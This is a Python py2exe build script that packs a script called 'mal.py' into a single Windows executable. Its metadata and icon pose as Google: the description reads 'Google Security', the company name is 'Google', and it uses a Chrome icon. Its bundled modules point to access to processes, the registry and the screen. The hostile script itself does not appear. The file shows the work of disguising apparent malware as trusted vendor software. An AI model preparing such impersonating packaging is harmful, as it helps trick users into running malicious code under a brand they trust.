from distutils.core import setup
import py2exe, sys, os

sys.argv.append('py2exe')
manifest_template = '''
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<assembly xmlns="urn:schemas-microsoft-com:asm.v1"
manifestVersion="1.0">
<assemblyIdentity
    version="0.64.1.0"
    processorArchitecture="x86"
    name="Controls"
    type="win32"
/>
<description>Google Security</description>
<dependency>
    <dependentAssembly>
        <assemblyIdentity
            type="win32"
            name="Microsoft.Windows.Common-Controls"
            version="6.0.0.0"
            processorArchitecture="X86"
            publicKeyToken="6595b64144ccf1df"
            language="*"
        />
    </dependentAssembly>
</dependency>
<dependency>
    <dependentAssembly>
        <assemblyIdentity
            type="win32"
            name="Microsoft.VC90.CRT"
            version="9.0.30729.4918"
            processorArchitecture="X86"
            publicKeyToken="1fc8b3b9a1e18e3b"
            language="*"
        />
    </dependentAssembly>
</dependency>
</assembly>
'''
RT_MANIFEST = 24
includes = ["psutil","scipy","psutil","shutil","winreg","ctypes","PIL"]

setup(
    options={'py2exe': {'bundle_files': 1, 'compressed': True, 'includes': includes}},
    windows=[{'script': "mal.py",
              "icon_resources": [(0, "Google-Chrome-Google-Chrome.ico")],
              'description': "Google Security",
              'version': "1.0",
              'company_name': "Google",
              'copyright': "Copyright 2022 Systems Incorporated",
              }],
    zipfile=None,
)
